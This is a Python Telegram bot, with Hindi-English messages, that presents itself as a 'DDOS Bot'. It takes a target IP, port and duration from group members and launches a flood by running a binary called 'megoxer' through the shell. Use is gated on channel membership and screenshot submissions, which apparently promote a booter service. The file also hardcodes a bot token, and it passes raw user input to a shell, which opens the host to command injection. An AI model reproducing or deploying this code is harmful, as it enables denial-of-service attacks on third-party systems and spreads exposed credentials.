#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading
from telebot import types

# Insert your Telegram bot token here
bot = telebot.TeleBot('8048715452:AAEdWGG7J-d1zVvmFSN1UiddyABpm34aLj0')

# Group and channel details
GROUP_ID = "-1002369239894"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"  # Screenshot yahan forward hoga

# Global variables
is_attack_running = False
attack_end_time = None
pending_feedback = {}
update_thread = None  # Background update thread

# Function to check if user is in channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# Function to create check status button
def create_check_button():
    markup = types.InlineKeyboardMarkup()
    button = types.InlineKeyboardButton("✅ Check Status", callback_data='check_status')
    markup.add(button)
    return markup

# Background function to update attack status
def update_attack_status(chat_id):
    global is_attack_running, attack_end_time
    while is_attack_running:
        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
        if remaining_time <= 0:
            bot.send_message(chat_id, "✅ **Attack Completed!**")
            is_attack_running = False
            return
        bot.send_message(chat_id, f"⏳ **Attack Running... Remaining Time: {int(remaining_time)}s**")
        time.sleep(5)  # Update every 5 seconds

# Handle attack command
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global is_attack_running, attack_end_time, update_thread
    user_id = str(message.from_user.id)
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 **Ye bot sirf group me chalega!** ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ **Pehle channel join karo:** {CHANNEL_USERNAME} 🔥")
        return

    if pending_feedback.get(user_id, False):
        bot.reply_to(message, "😡 **Pehle screenshot bhejo, tabhi agla attack kar sakoge!** 🔥")
        return

    if is_attack_running:
        bot.reply_to(message, "⚠️ **Ek attack already chal raha hai! Please wait.**")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ **Usage:** /attack `<IP>` `<PORT>` `<TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ **Port aur Time numbers hone chahiye!**")
        return

    if time_duration > 180:
        bot.reply_to(message, "🚫 **Max duration = 180s!**")
        return

    # Confirm attack
    confirm_msg = f"""⚡ **Attack Details:**  
🎯 **Target:** `{target}`  
🔢 **Port:** `{port}`  
⏳ **Duration:** `{time_duration}s`  
🔄 **Status:** `Starting...`  
📸 **Note:** Attack ke baad screenshot zaroor do!"""

    bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown", reply_markup=create_check_button())

    is_attack_running = True
    attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)
    pending_feedback[user_id] = True  # Screenshot required after attack

    # Start background update thread
    update_thread = threading.Thread(target=update_attack_status, args=(message.chat.id,))
    update_thread.start()

    bot.send_message(message.chat.id, f"🚀 **Attack Started!**\n🎯 `{target}:{port}`\n⏳ {time_duration}s", parse_mode="Markdown")

    try:
        subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True)
    except subprocess.CalledProcessError:
        bot.reply_to(message, "❌ **Attack failed due to an error!**")
        is_attack_running = False
        attack_end_time = None
        return

    bot.send_message(message.chat.id, "✅ **Attack Completed!** 🎯\n📸 **Ab screenshot bhejo!**")

    is_attack_running = False
    attack_end_time = None

# Handle check status button click
@bot.callback_query_handler(func=lambda call: call.data == 'check_status')
def callback_check_status(call):
    if is_attack_running and attack_end_time:
        remaining_time = (attack_end_time - datetime.datetime.now()).total_seconds()
        bot.reply_to(call.message, f"⏳ **Attack Running... Remaining Time: {int(remaining_time)}s**")
    else:
        bot.reply_to(call.message, "✅ **No attack is running!**")

# Handle screenshot submission and forward to main channel
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = str(message.from_user.id)
    
    if pending_feedback.get(user_id, False):
        bot.forward_message(CHANNEL_USERNAME, message.chat.id, message.message_id)  # Forward to main channel
        bot.send_message(CHANNEL_USERNAME, f"📸 **Screenshot Received from** `{user_id}`")

        bot.reply_to(message, "✅ **Screenshot mil gaya! Ab naya attack laga sakte ho.** 🚀")
        del pending_feedback[user_id]  # Remove user from pending list
    else:
        bot.reply_to(message, "❌ **Screenshot required nahi hai!**")

# Bot start command
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"""🌟🔥 Welcome {user_name}! 🔥🌟

🚀 **DDOS Bot Ready!**  
💥 Attack commands ka use karne ke liye group aur channel join karein.  

🔗 **Join Now:**  
👉 [Telegram Group](https://t.me/R_SDanger_op) 🚀🔥"""
    
    bot.reply_to(message, response, parse_mode="Markdown")

# Start polling
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
        time.sleep(15)